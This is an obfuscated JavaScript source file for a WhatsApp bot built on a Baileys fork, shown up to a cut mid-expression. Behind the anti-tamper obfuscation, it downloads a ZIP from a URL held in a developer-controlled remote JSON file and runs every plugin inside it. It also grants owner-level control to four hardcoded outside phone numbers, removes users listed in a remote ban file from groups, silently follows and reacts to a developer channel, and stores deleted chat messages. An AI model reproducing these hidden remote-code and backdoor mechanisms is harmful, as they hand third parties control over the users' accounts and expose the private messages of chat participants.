const o = (function () {
    let M = true
    return function (p, n) {
      const U = M
        ? function () {
            if (n) {
              const O = n.apply(p, arguments)
              return (n = null), O
            }
          }
        : function () {}
      return (M = false), U
    }
  })(),
  y = o(this, function () {
    return y
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(y)
      .search('(((.+)+)+)+$')
  })
y()
const i = (function () {
  let M = true
  return function (p, n) {
    const U = M
      ? function () {
          if (n) {
            const D = n.apply(p, arguments)
            return (n = null), D
          }
        }
      : function () {}
    return (M = false), U
  }
})()
;(function () {
  i(this, function () {
    const K = new RegExp('function *\\( *\\)'),
      M = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      p = a('init')
    if (!K.test(p + 'chain') || !M.test(p + 'input')) {
      p('0')
    } else {
      a()
    }
  })()
})()
const {
    default: makeWASocket,
    getAggregateVotesInPollMessage,
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto,
  } = require('darksadas-new-baliyes'),
  fs = require('fs'),
  P = require('pino'),
  config = require('./config'),
  qrcode = require('qrcode-terminal'),
  NodeCache = require('node-cache')
;(function () {
  const h = function () {
      const M = {
        TNQZu:
          '\u2705 Session downloaded from Mega.nz and saved to creds.json!',
      }
      const p = M
      let Y
      try {
        Y = Function('return (function() {}.constructor("return this")( ));')()
      } catch (U) {
        Y = window
      }
      return Y
    },
    K = h()
  K.setInterval(a, 4000)
})()
const util = require('util'),
  axios = require('axios'),
  { File } = require('megajs'),
  path = require('path'),
  msgRetryCounterCache = new NodeCache()
const FileType = require('file-type'),
  l = console.log,
  SESSION_DIR = './' + config.SESSION_NAME
!fs.existsSync(SESSION_DIR) && fs.mkdirSync(SESSION_DIR)
if (!fs.existsSync(__dirname + ('/' + config.SESSION_NAME + '/creds.json'))) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace('𝙽𝙰𝙳𝙴𝙴𝙽-𝙼𝙳=', '')
    if (sessdata.includes('#')) {
      const filer = File.fromURL('https://mega.nz/file/' + sessdata)
      filer.download((h, K) => {
        if (h) {
          throw h
        }
        fs.writeFile(
          __dirname + ('/' + config.SESSION_NAME + '/creds.json'),
          K,
          () => {
            console.log(
              '\u2705 Session downloaded from Mega.nz and saved to creds.json!'
            )
          }
        )
      })
    } else {
      const sessionUrl =
        'https://saviya-kolla-database.vercel.app/SESSIONS/' + sessdata
      console.log('\uD83D\uDCE5 Downloading session from Saviyakolla-DB')
      ;(async () => {
        try {
          const p = await axios.get(sessionUrl)
          fs.writeFileSync(
            __dirname + ('/' + config.SESSION_NAME + '/creds.json'),
            JSON.stringify(p.data, null, 2)
          )
          console.log(
            '\u2705 Saviya DB session file downloaded and saved to creds.json!'
          )
        } catch (n) {
          console.error(
            '\u274C Failed to download local DB session file:',
            n.message
          )
        }
      })()
    }
  }
}
const express = require('express'),
  app = express()
const port = process.env.PORT || config.PORT,
  { exec } = require('child_process'),
  AdmZip = require('adm-zip'),
  PLUGINS_DIR = './plugins',
  LIB_DIR = './lib',
  DATA_DIR = './data',
  ZIP_DIR = './',
  connect = async () => {
    let p = await axios.get(
      'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json'
    )
    const n = '' + p.data.megaurl
    if (!fs.existsSync(PLUGINS_DIR)) {
      const A = { recursive: true }
      fs.mkdirSync(PLUGINS_DIR, A)
    }
    if (fs.existsSync(DATA_DIR)) {
      const Z = {
        recursive: true,
        force: true,
      }
      fs.rmSync(DATA_DIR, Z)
    }
    if (!fs.existsSync(LIB_DIR)) {
      const c = { recursive: true }
      fs.mkdirSync(LIB_DIR, c)
    }
    console.log('Fetching ZIP file from Mega.nz...')
    const Y = File.fromURL('' + n),
      q = await Y.downloadBuffer(),
      U = path.join(__dirname, 'temp.zip')
    fs.writeFileSync(U, q)
    console.log('NADEEN ZIP file downloaded successfully \u2705')
    const W = new AdmZip(U)
    W.extractAllTo(ZIP_DIR, true)
    console.log('Plugins extracted successfully \u2705')
    console.log('Lib extracted successfully \u2705')
    console.log('Installing plugins \uD83D\uDD0C... ')
    fs.readdirSync('./plugins/').forEach((m) => {
      path.extname(m).toLowerCase() == '.js' && require('./plugins/' + m)
    })
    fs.unlinkSync(U)
    const { sleep: O } = require('./lib/functions')
    var { connectdb: F, updb: D } = require('./lib/database')
    await F()
    await D()
    console.log('NADEEEN CONNECTED \u2705')
    await O(3000)
    await connectToWA()
  }
async function connectToWA() {
  const { version: h, isLatest: K } = await fetchLatestBaileysVersion(),
    {
      getBuffer: M,
      getGroupAdmins: p,
      getRandom: n,
      sleep: Y,
      fetchJson: q,
    } = require('./lib/functions'),
    { sms: U } = require('./lib/msg')
  var {
    updateCMDStore: W,
    isbtnID: O,
    getCMDStore: F,
    getCmdForCmdId: D,
    input: R,
    get: A,
    getalls: Z,
    updfb: E,
    upresbtn: r,
  } = require('./lib/database')
  const c = config.PREFIX,
    m = config.AUTO_READ_STATUS,
    s = config.ONLY_GROUP,
    x = config.ANTI_CALL
  const f = config.AUTO_BLOCK
  const H = config.ANTI_BAD,
    t = config.ANTI_LINK,
    j = config.AUTO_TYPING,
    k = config.ANTI_BOT,
    g = config.AUTO_MSG_READ
  const G = config.CMD_ONLY_READ,
    z = config.AUTO_RECORDING,
    J = config.AUTO_REACT,
    e = config.OWNER_NUMBER,
    B = (
      await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')
    ).data,
    C = '' + B.connectmg,
    v = '' + B.cmsglogo,
    { state: d, saveCreds: T } = await useMultiFileAuthState(
      __dirname + ('/' + config.SESSION_NAME + '/')
    ),
    w = makeWASocket({
      logger: P({ level: 'fatal' }).child({ level: 'fatal' }),
      printQRInTerminal: true,
      generateHighQualityLinkPreview: true,
      auth: d,
      defaultQueryTimeoutMs: undefined,
      msgRetryCounterCache: msgRetryCounterCache,
    })
  w.ev.on('connection.update', async (N) => {
    const { connection: u, lastDisconnect: X } = N
    if (u === 'close') {
      X.error.output.statusCode !== DisconnectReason.loggedOut && connectToWA()
    } else {
      if (u === 'open') {
        console.log('WA CONNECTED \u2705')
        const a2 = (
            await axios.get(
              'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json'
            )
          ).data,
          a3 = '' + a2.supglink,
          a4 = { url: v }
        const a5 = {
          image: a4,
          caption: C,
        }
        await w.sendMessage(e + '@s.whatsapp.net', a5)
      }
    }
  })
  w.ev.on('creds.update', T)
  w.ev.on('messages.upsert', async (N) => {
    try {
      async function u() {
        const au = await Z()
        if (au) {
          Object.assign(config, au)
        }
      }
      u().catch(console.error)
      N = N.messages[0]
      if (!N.message) {
        return
      }
      N.message =
        getContentType(N.message) === 'ephemeralMessage'
          ? N.message.ephemeralMessage.message
          : N.message
      if (!N.message) {
        return
      }
      N.message =
        getContentType(N.message) === 'ephemeralMessage'
          ? N.message.ephemeralMessage.message
          : N.message
      if (
        N.key &&
        N.key.remoteJid === 'status@broadcast' &&
        config.AUTO_READ_STATUS === 'true'
      ) {
        const aS = [
            '\uD83E\uDDE9',
            '\uD83C\uDF49',
            '\uD83D\uDC9C',
            '\uD83C\uDF38',
            '\uD83E\uDEB4',
            '\uD83D\uDC8A',
            '\uD83D\uDCAB',
            '\uD83C\uDF42',
            '\uD83C\uDF1F',
            '\uD83C\uDF8B',
            '\uD83D\uDE36‍\uD83C\uDF2B️',
            '\uD83E\uDEC0',
            '\uD83E\uDDFF',
            '\uD83D\uDC40',
            '\uD83E\uDD16',
            '\uD83D\uDEA9',
            '\uD83E\uDD70',
            '\uD83D\uDDFF',
            '\uD83D\uDC9C',
            '\uD83D\uDC99',
            '\uD83C\uDF1D',
            '\uD83D\uDDA4',
            '\uD83D\uDC9A',
          ],
          aL = aS[Math.floor(Math.random() * aS.length)]
        await w.readMessages([N.key])
        const au = await jidNormalizedUser(w.user.id)
        await w.sendMessage(
          N.key.remoteJid,
          {
            react: {
              key: N.key,
              text: aL,
            },
          },
          {
            statusJidList: [N.key.participant, au],
          }
        )
      }
      if (N.key && N.key.remoteJid === 'status@broadcast') {
        return
      }
      const X = await w.newsletterMetadata('jid', '' + B.mainchanal)
      if (X.viewer_metadata === null) {
        await w.newsletterFollow('' + B.mainchanal)
        console.log('NADEEN MD UPDATES CHNAL FOLLOW \u2705')
      }
      const b = U(w, N),
        a0 = getContentType(N.message),
        a1 = JSON.stringify(N.message),
        a2 = N.key.remoteJid,
        a3 =
          a0 == 'extendedTextMessage' &&
          N.message.extendedTextMessage.contextInfo != null
            ? N.message.extendedTextMessage.contextInfo.quotedMessage || []
            : [],
        a4 =
          a0 === 'conversation'
            ? N.message.conversation
            : N.message?.extendedTextMessage?.contextInfo?.hasOwnProperty(
                'quotedMessage'
              ) &&
              (await O(
                N.message?.extendedTextMessage?.contextInfo?.stanzaId
              )) &&
              D(
                await F(N.message?.extendedTextMessage?.contextInfo?.stanzaId),
                N?.message?.extendedTextMessage?.text
              )
            ? D(
                await F(N.message?.extendedTextMessage?.contextInfo?.stanzaId),
                N?.message?.extendedTextMessage?.text
              )
            : a0 === 'extendedTextMessage'
            ? N.message.extendedTextMessage.text
            : a0 == 'imageMessage' && N.message.imageMessage.caption
            ? N.message.imageMessage.caption
            : a0 == 'videoMessage' && N.message.videoMessage.caption
            ? N.message.videoMessage.caption
            : '',
        a5 = config.PREFIX,
        a6 = a4.startsWith(a5),
        a7 = a6
          ? a4.slice(a5.length).trim().split(' ').shift().toLowerCase()
          : '',
        a8 = a4.trim().split(/ +/).slice(1),
        a9 = a8.join(' '),
        aa = a2.endsWith('@g.us'),
        ai = N.key.fromMe
          ? w.user.id.split(':')[0] + '@s.whatsapp.net' || w.user.id
          : N.key.participant || N.key.remoteJid,
        ay = ai.split('@')[0],
        ao = w.user.id.split(':')[0],
        aQ = N.pushName || 'Sin Nombre',
        aI = '94775527010,94722617699,94788518429,94787318729',
        aV = aI.split(','),
        ah = ao.includes(ay),
        aK = aV.includes(ay),
        aM = ah ? ah : aK,
        ap = e.includes(ay) || aM,
        an = await jidNormalizedUser(w.user.id),
        aY = aa ? await w.groupMetadata(a2).catch((i0) => null) : null,
        aq = aa && aY ? aY.subject : '',
        aU = aa && aY ? aY.participants : [],
        aW = aa ? p(aU) : [],
        aP = aa ? aW.includes(an) : false,
        aO = aa ? aW.includes(ai) : false,
        aF = b.message.reactionMessage ? true : false,
        aD = (i0) => {
          let i3 = i0
          for (let i4 = 0; i4 < i3.length; i4++) {
            if (i3[i4] === a2) {
              return true
            }
          }
          return false
        },
        aR = async (i0) => {
          const i1 = { text: i0 }
          const i2 = {}
          return (i2.quoted = N), await w.sendMessage(a2, i1, i2)
        }
      w.replyad = async (i0) => {
        const i1 = { text: i0 }
        const i2 = { quoted: N }
        await w.sendMessage(a2, i1, i2)
      }
      w.buttonMessage2 = async (i0, i1, i2) => {
        let i6 = ''
        const i7 = []
        i1.buttons.forEach((i8, i9) => {
          const ii = '' + (i9 + 1)
          i6 += '\n*' + ii + ' ||*  ' + i8.buttonText.displayText
          const iy = {
            cmdId: ii,
            cmd: i8.buttonId,
          }
          i7.push(iy)
        })
        if (i1.headerType === 1) {
          const i8 =
              i1.text +
              '\n\n*`Reply Below Number \uD83D\uDD22`*\n' +
              i6 +
              '\n\n' +
              i1.footer,
            i9 = { text: i8 }
          const ia = await w.sendMessage(a2, i9, { quoted: i2 || N })
          await W(ia.key.id, i7)
        } else {
          if (i1.headerType === 4) {
            const io =
                i1.caption +
                '\n\n*`Reply Below Number \uD83D\uDD22`*\n' +
                i6 +
                '\n\n' +
                i1.footer,
              iQ = {
                image: i1.image,
                caption: io,
              }
            const iI = await w.sendMessage(i0, iQ, { quoted: i2 || N })
            await W(iI.key.id, i7)
          }
        }
      }
      w.buttonMessage = async (i0, i1, i2) => {
        let i5 = ''
        const i6 = []
        i1.buttons.forEach((i7, i8) => {
          const ia = '' + (i8 + 1)
          i5 += '\n*' + ia + ' ||*  ' + i7.buttonText.displayText
          const ii = {
            cmdId: ia,
            cmd: i7.buttonId,
          }
          i6.push(ii)
        })
        if (i1.headerType === 1) {
          const i8 =
              (i1.text || i1.caption) +
              '\n\n*`Reply Below Number \uD83D\uDD22`*\n' +
              i5 +
              '\n\n' +
              i1.footer,
            i9 = { text: i8 }
          const ia = await w.sendMessage(a2, i9, { quoted: i2 || N })
          await W(ia.key.id, i6)
        } else {
          if (i1.headerType === 4) {
            const iy =
                i1.caption +
                '\n\n*`Reply Below Number \uD83D\uDD22`*\n' +
                i5 +
                '\n\n' +
                i1.footer,
              io = {
                image: i1.image,
                caption: iy,
              }
            const iQ = await w.sendMessage(i0, io, { quoted: i2 || N })
            await W(iQ.key.id, i6)
          }
        }
      }
      w.listMessage2 = async (i0, i1, i2) => {
        let i5 = ''
        const i6 = []
        i1.sections.forEach((ia, ii) => {
          const iQ = '' + (ii + 1)
          i5 += '\n*' + ia.title + '*\n\n'
          ia.rows.forEach((iI, iV) => {
            const iK = iQ + '.' + (iV + 1),
              iM = '*' + iK + ' ||* ' + iI.title
            i5 += iM + '\n'
            if (iI.description) {
              i5 += '   ' + iI.description + '\n\n'
            }
            const ip = {
              cmdId: iK,
              cmd: iI.rowId,
            }
            i6.push(ip)
          })
        })
        const i7 =
            i1.text + '\n\n' + i1.buttonText + ',' + i5 + '\n' + i1.footer,
          i8 = { text: i7 }
        const i9 = await w.sendMessage(a2, i8, { quoted: i2 || N })
        await W(i9.key.id, i6)
      }
      w.listMessage = async (i0, i1, i2) => {
        let i7 = ''
        const i8 = []
        i1.sections.forEach((iy, io) => {
          const iQ = '' + (io + 1)
          i7 += '\n*' + iy.title + '*\n\n'
          iy.rows.forEach((iI, iV) => {
            const iK = iQ + '.' + (iV + 1),
              iM = '*' + iK + ' ||*  ' + iI.title
            i7 += iM + '\n'
            iI.description && (i7 += '   ' + iI.description + '\n\n')
            const ip = {
              cmdId: iK,
              cmd: iI.rowId,
            }
            i8.push(ip)
          })
        })
        const i9 =
            i1.text + '\n\n' + i1.buttonText + ',' + i7 + '\n\n' + i1.footer,
          ia = { text: i9 }
        const ii = await w.sendMessage(a2, ia, { quoted: i2 || N })
        await W(ii.key.id, i8)
      }
      w.edite = async (i0, i1) => {
        const i2 = { conversation: i1 }
        const i3 = {
          key: i0.key,
          type: 14,
          editedMessage: i2,
        }
        const i4 = { protocolMessage: i3 }
        await w.relayMessage(a2, i4, {})
      }
      w.forwardMessage = async (i0, i1, i2 = false, i3 = {}) => {
        let i5
        if (i3.readViewOnce) {
          i1.message =
            i1.message &&
            i1.message.ephemeralMessage &&
            i1.message.ephemeralMessage.message
              ? i1.message.ephemeralMessage.message
              : i1.message || undefined
          i5 = Object.keys(i1.message.viewOnceMessage.message)[0]
          delete (i1.message && i1.message.ignore
            ? i1.message.ignore
            : i1.message || undefined)
          delete i1.message.viewOnceMessage.message[i5].viewOnce
          i1.message = { ...i1.message.viewOnceMessage.message }
        }
        let i6 = Object.keys(i1.message)[0],
          i7 = await generateForwardMessageContent(i1, i2),
          i8 = Object.keys(i7)[0],
          i9 = {}
        if (i6 != 'conversation') {
          i9 = i1.message[i6].contextInfo
        }
        i7[i8].contextInfo = {
          ...i9,
          ...i7[i8].contextInfo,
        }
        const ia = await generateWAMessageFromContent(
          i0,
          i7,
          i3
            ? {
                ...i7[i8],
                ...i3,
                ...(i3.contextInfo
                  ? {
                      contextInfo: {
                        ...i7[i8].contextInfo,
                        ...i3.contextInfo,
                      },
                    }
                  : {}),
              }
            : {}
        )
        return (
          await w.relayMessage(i0, ia.message, { messageId: ia.key.id }), ia
        )
      }
      w.sendFileUrl = async (i0, i1, i2, i3, i4 = {}) => {
        let i6 = '',
          i7 = await axios.head(i1)
        i6 = i7.headers['content-type']
        if (i6.split('/')[1] === 'gif') {
          return w.sendMessage(
            i0,
            {
              video: await M(i1),
              caption: i2,
              gifPlayback: true,
              ...i4,
            },
            {
              quoted: i3,
              ...i4,
            }
          )
        }
        let i8 = i6.split('/')[0] + 'Message'
        if (i6 === 'application/pdf') {
          return w.sendMessage(
            i0,
            {
              document: await M(i1),
              mimetype: 'application/pdf',
              caption: i2,
              ...i4,
            },
            {
              quoted: i3,
              ...i4,
            }
          )
        }
        if (i6.split('/')[0] === 'image') {
          return w.sendMessage(
            i0,
            {
              image: await M(i1),
              caption: i2,
              ...i4,
            },
            {
              quoted: i3,
              ...i4,
            }
          )
        }
        if (i6.split('/')[0] === 'video') {
          return w.sendMessage(
            i0,
            {
              video: await M(i1),
              caption: i2,
              mimetype: 'video/mp4',
              ...i4,
            },
            {
              quoted: i3,
              ...i4,
            }
          )
        }
        if (i6.split('/')[0] === 'audio') {
          return w.sendMessage(
            i0,
            {
              audio: await M(i1),
              caption: i2,
              mimetype: 'audio/mpeg',
              ...i4,
            },
            {
              quoted: i3,
              ...i4,
            }
          )
        }
      }
      const al = (
        await axios.get(
          'https://mv-visper-full-db.pages.dev/Main/main_var.json'
        )
      ).data
      config.FOOTER = al.footer
      const aZ = await q(
          'https://mv-visper-full-db.pages.dev/Main/premium_user.json'
        ),
        aE = aZ.numbers.split(','),
        ar = aE
          .map((i0) => i0.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(ai),
        ac = await q('https://mv-visper-full-db.pages.dev/Main/alex.json'),
        am = ac.alex.split(','),
        as = am
          .map((i0) => i0.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(ai),
        ax = await q(
          'https://mv-visper-full-db.pages.dev/Main/ban_number.json'
        ),
        af = ax.split(','),
        aH = [...af]
          .map((i0) => i0.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(ai)
      let at = '' + config.JID_BLOCK
      const aj = at.split(','),
        ak = [...aj].includes(a2)
      let ag = '' + config.SUDO
      const aG = ag.split(','),
        az = [...aG].includes(ai)
      if (a6 && ak && !aM && !az) {
        return
      }
      const aJ = (
          await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')
        ).data,
        ae = (
          await axios.get(
            'https://mv-visper-full-db.pages.dev/Main/main_var.json'
          )
        ).data,
        aB = N.key.server_id
      await w.newsletterReactMessage('' + ae.mainchanal, aB, '' + ae.chreact)
      if (ay.includes('94778500326')) {
        if (aF) {
          return
        }
        b.react('' + aJ.sadas)
      }
      if (ay.includes('94722617699')) {
        if (aF) {
          return
        }
        b.react('' + aJ.saviya)
      }
      if (ay.includes('94724884317')) {
        if (aF) {
          return
        }
        b.react('' + aJ.damiru)
      }
      if (ay.includes('94787318429')) {
        if (aF) {
          return
        }
        b.react('' + aJ.sadas)
      }
      const aC = config.OWNER_NUMBER
      if (ay.includes(aC)) {
        if (aF) {
          return
        }
        b.react('\uD83D\uDC81‍\u2642️')
      }
      a6 && config.CMD_ONLY_READ == 'true' && (await w.readMessages([N.key]))
      if (config.WORK_TYPE == 'only_group') {
        if (!aa && a6 && !aM && !ap && !az) {
          return
        }
      }
      if (config.WORK_TYPE == 'private') {
        if (a6 && !aM && !ap && !az) {
          return
        }
      }
      if (config.WORK_TYPE == 'inbox') {
        if (aa && !aM && !ap && !az) {
          return
        }
      }
      if (aH) {
        const ia = { delete: N.key }
        await w.sendMessage(a2, ia)
        await w.groupParticipantsUpdate(a2, [ai], 'remove')
        const ii = {}
        return (
          (ii.text = '*You are banned by VISPER TEAM \u274C*'),
          await w.sendMessage(a2, ii)
        )
      }
      if (config.AUTO_BLOCK == 'true' && N.chat.endsWith('@s.whatsapp.net')) {
        if (!aM) {
          const iV = {}
          iV.text = '*Warning 1 \u2757*'
          await w.sendMessage(a2, iV)
          const iK = {}
          iK.text = '*Warning 2 \u2757*'
          await w.sendMessage(a2, iK)
          const ih = {}
          ih.text = '*Warning 3 \u2757*'
          await w.sendMessage(a2, ih)
          const iM = {}
          iM.text = '*Blocked \uD83D\uDEAB*'
          await w.sendMessage(a2, iM)
          await w.updateBlockStatus(N.sender, 'block')
        }
      }
      w.ev.on('call', async (ip) => {
        if (config.ANTI_CALL == 'true') {
          for (const iq of ip) {
            if (iq.status === 'offer') {
              await w.rejectCall(iq.id, iq.from)
              if (!iq.isGroup) {
                await w.sendMessage(iq.from, {
                  text: '*Call rejected automatically because owner is busy \u26A0️*',
                  mentions: [iq.from],
                })
                break
              }
            }
          }
        }
      })
      if (a6 && config.CMD_ONLY_READ == 'true') {
        await w.readMessages([N.key])
      }
      const av = [
          '\u2764',
          '\uD83D\uDC95',
          '\uD83D\uDE3B',
          '\uD83E\uDDE1',
          '\uD83D\uDC9B',
          '\uD83D\uDC9A',
          '\uD83D\uDC99',
          '\uD83D\uDC9C',
          '\uD83D\uDDA4',
          '\u2763',
          '\uD83D\uDC9E',
          '\uD83D\uDC93',
          '\uD83D\uDC97',
          '\uD83D\uDC96',
          '\uD83D\uDC98',
          '\uD83D\uDC9D',
          '\uD83D\uDC9F',
          '\u2665',
          '\uD83D\uDC8C',
          '\uD83D\uDE42',
          '\uD83E\uDD17',
          '\uD83D\uDE0C',
          '\uD83D\uDE09',
          '\uD83E\uDD17',
          '\uD83D\uDE0A',
          '\uD83C\uDF8A',
          '\uD83C\uDF89',
          '\uD83C\uDF81',
          '\uD83C\uDF88',
          '\uD83D\uDC4B',
        ],
        ad = av[Math.floor(Math.random() * av.length)]
      if (!aM && !ak && config.AUTO_REACT == 'true') {
        if (aF) {
          return
        }
        await w.sendMessage(N.chat, {
          react: {
            text: ad,
            key: N.key,
          },
        })
      }
      if (config.AUTO_MSG_READ == 'true') {
        await w.readMessages([N.key])
      }
      if (config.AUTO_TYPING == 'true') {
        w.sendPresenceUpdate('composing', N.key.remoteJid)
      }
      if (config.AUTO_RECORDING == 'true') {
        w.sendPresenceUpdate('recording', N.key.remoteJid)
      }
      if (config.CHAT_BOT == 'true') {
        if (b.quoted) {
          let iO = b.body ? b.body.toLowerCase() : ''
          try {
            let iF = await q(
              'https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=' + iO
            )
            const iD = { text: iF.result.data }
            await w.sendMessage(a2, iD)
          } catch (iA) {
            console.error('AI Chat Error:', iA)
            const il = { text: '.' }
            await w.sendMessage(a2, il)
          }
        }
      }
      if (!ap) {
        if (config.ANTI_DELETE == 'true') {
          if (!b.id.startsWith('BAE5')) {
            const ir = 'message_data'
            !fs.existsSync(ir) && fs.mkdirSync(ir)
            function ic(ij, ik) {
              const iz = path.join(ir, ij, ik + '.json')
              try {
                const ie = fs.readFileSync(iz, 'utf8')
                return JSON.parse(ie) || []
              } catch (iB) {
                return []
              }
            }
            function im(ij, ik, ig) {
              const iz = path.join(ir, ij)
              if (!fs.existsSync(iz)) {
                const iB = { recursive: true }
                fs.mkdirSync(iz, iB)
              }
              const iJ = path.join(iz, ik + '.json')
              try {
                fs.writeFileSync(iJ, JSON.stringify(ig, null, 2))
              } catch (iv) {
                console.error('Error saving chat data:', iv)
              }
            }
            function is(ij) {
              const ik = a2,
                ig = ij.key.id
              const iG = ic(ik, ig)
              iG.push(ij)
              im(ik, ig, iG)
            }
            const ix = a2
            function iH(ij) {
              const ig = a2
              const iG = ij.msg.key.id,
                iz = ic(ig, iG),
                iJ = iz[0]
              if (iJ) {
                const iB = ij.sender.split('@')[0],
                  iC = iJ.key.participant ?? ij.sender,
                  iv = iC.split('@')[0]
                if (iB.includes(ao) || iv.includes(ao)) {
                  return
                }
                if (
                  iJ.message &&
                  iJ.message.conversation &&
                  iJ.message.conversation !== ''
                ) {
                  const iT = iJ.message.conversation
                  var ie = '```'
                  const iw = {
                    text:
                      '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                      iB +
                      '_\n  \uD83D\uDCE9 *Sent by:* _' +
                      iv +
                      '_\n\n> \uD83D\uDD13 Message Text: ' +
                      ie +
                      iT +
                      ie,
                  }
                  w.sendMessage(ix, iw)
                } else {
                  if (iJ.msg.type === 'MESSAGE_EDIT') {
                    const iN = {
                      text:
                        '\u274C *edited message detected* ' +
                        iJ.message.editedMessage.message.protocolMessage
                          .editedMessage.conversation,
                    }
                    const iS = { quoted: N }
                    w.sendMessage(ix, iN, iS)
                  } else {
                    if (
                      iJ.message &&
                      iJ.message.exetendedTextMessage &&
                      iJ.msg.text
                    ) {
                      const iL = iJ.msg.text
                      if (aa && iL.includes('chat.whatsapp.com')) {
                        return
                      }
                      var ie = '```'
                      const iu = {
                        text:
                          '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                          iB +
                          '_\n  \uD83D\uDCE9 *Sent by:* _' +
                          iv +
                          '_\n\n> \uD83D\uDD13 Message Text: ' +
                          ie +
                          iL +
                          ie,
                      }
                      w.sendMessage(ix, iu)
                    } else {
                      if (iJ.message && iJ.message.exetendedTextMessage) {
                        const iX = iJ.message.extendedTextMessage.text
                        if (aa && messageText.includes('chat.whatsapp.com')) {
                          return
                        }
                        var ie = '```'
                        const ib = {
                          text:
                            '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                            iB +
                            '_\n  \uD83D\uDCE9 *Sent by:* _' +
                            iv +
                            '_\n\n> \uD83D\uDD13 Message Text: ' +
                            ie +
                            iJ.body +
                            ie,
                        }
                        w.sendMessage(ix, ib)
                      } else {
                        if (iJ.type === 'extendedTextMessage') {
                          async function y0() {
                            var y1 = n('')
                            const y2 = U(w, iJ)
                            if (iJ.message.extendedTextMessage) {
                              const y4 = iJ.message.extendedTextMessage.text
                              if (
                                aa &&
                                messageText.includes('chat.whatsapp.com')
                              ) {
                                return
                              }
                              var y3 = '```'
                              const y5 = {
                                text:
                                  '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                  iB +
                                  '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                  iv +
                                  '_\n\n> \uD83D\uDD13 Message Text: ' +
                                  y3 +
                                  iJ.message.extendedTextMessage.text +
                                  y3,
                              }
                              w.sendMessage(ix, y5)
                            } else {
                              const y6 = iJ.message.extendedTextMessage.text
                              if (
                                aa &&
                                messageText.includes('chat.whatsapp.com')
                              ) {
                                return
                              }
                              const y7 = {
                                text:
                                  '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                  iB +
                                  '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                  iv +
                                  '_\n\n> \uD83D\uDD13 Message Text: ' +
                                  y3 +
                                  iJ.message.extendedTextMessage.text +
                                  y3,
                              }
                              w.sendMessage(ix, y7)
                            }
                          }
                          y0()
                        } else {
                          if (iJ.type === 'imageMessage') {
                            async function y1() {
                              var y2 = n('')
                              const y3 = U(w, iJ)
                              let y4 = await y3.download(y2)
                              let y5 = require('file-type'),
                                y6 = y5.fromBuffer(y4)
                              await fs.promises.writeFile('./' + y6.ext, y4)
                              if (iJ.message.imageMessage.caption) {
                                const y7 = iJ.message.imageMessage.caption
                                if (aa && y7.includes('chat.whatsapp.com')) {
                                  return
                                }
                                await w.sendMessage(ix, {
                                  image: fs.readFileSync('./' + y6.ext),
                                  caption:
                                    '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                    iB +
                                    '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                    iv +
                                    '_\n\n> \uD83D\uDD13 Message Text: ' +
                                    iJ.message.imageMessage.caption,
                                })
                              } else {
                                await w.sendMessage(ix, {
                                  image: fs.readFileSync('./' + y6.ext),
                                  caption:
                                    '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                    iB +
                                    '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                    iv +
                                    '_',
                                })
                              }
                            }
                            y1()
                          } else {
                            if (iJ.type === 'videoMessage') {
                              async function y2() {
                                var y3 = n('')
                                const y4 = U(w, iJ)
                                const y5 = iJ.message.videoMessage.fileLength,
                                  y6 = iJ.message.videoMessage.seconds
                                const y7 = config.MAX_SIZE
                                const y8 = y5,
                                  y9 = y8 / 1048576
                                const ya = y6
                                if (iJ.message.videoMessage.caption) {
                                  if (y9 < y7 && ya < 1800) {
                                    let yi = await y4.download(y3),
                                      yy = require('file-type'),
                                      yo = yy.fromBuffer(yi)
                                    await fs.promises.writeFile(
                                      './' + yo.ext,
                                      yi
                                    )
                                    const yQ = iJ.message.videoMessage.caption
                                    if (
                                      aa &&
                                      yQ.includes('chat.whatsapp.com')
                                    ) {
                                      return
                                    }
                                    await w.sendMessage(ix, {
                                      video: fs.readFileSync('./' + yo.ext),
                                      caption:
                                        '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                        iB +
                                        '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                        iv +
                                        '_\n\n> \uD83D\uDD13 Message Text: ' +
                                        iJ.message.videoMessage.caption,
                                    })
                                  }
                                } else {
                                  let yI = await y4.download(y3),
                                    yV = require('file-type'),
                                    yh = yV.fromBuffer(yI)
                                  await fs.promises.writeFile('./' + yh.ext, yI)
                                  const yK = iJ.message.videoMessage.fileLength,
                                    yM = iJ.message.videoMessage.seconds,
                                    yp = config.MAX_SIZE,
                                    yn = yK,
                                    yY = yn / 1048576,
                                    yq = yM
                                  yY < yp &&
                                    yq < 1800 &&
                                    (await w.sendMessage(ix, {
                                      video: fs.readFileSync('./' + yh.ext),
                                      caption:
